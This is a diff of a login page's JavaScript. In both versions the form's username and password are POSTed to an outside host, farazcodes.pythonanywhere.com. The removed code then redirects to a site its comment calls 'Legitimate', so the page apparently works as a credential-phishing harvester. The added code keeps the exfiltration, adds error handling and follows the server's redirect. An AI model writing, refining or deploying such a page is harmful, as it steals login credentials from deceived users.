@@ -11,25 +11,28 @@
         <button type="submit">Login</button>
     </form>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const formData = new FormData(e.target);
-            const data = {
-                username: formData.get('username'),
-                password: formData.get('password')
-            };
+<script>
+  document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const formData = new FormData(e.target);
+    const data = {
+      username: formData.get('username'),
+      password: formData.get('password')
+    };
 
-            // Send data to PythonAnywhere backend
-            await fetch('https://farazcodes.pythonanywhere.com/submit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
+    try {
+      const response = await fetch('https://farazcodes.pythonanywhere.com/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+      console.log('Response:', response); // Check the response
+      if (response.redirected) window.location.href = response.url;
+    } catch (error) {
+      console.error('Error:', error); // Log errors
+    }
+  });
+</script>
 
-            // Redirect after submission
-            window.location.href = 'https://example.com'; // Legitimate site
-        });
-    </script>
 </body>
 </html>
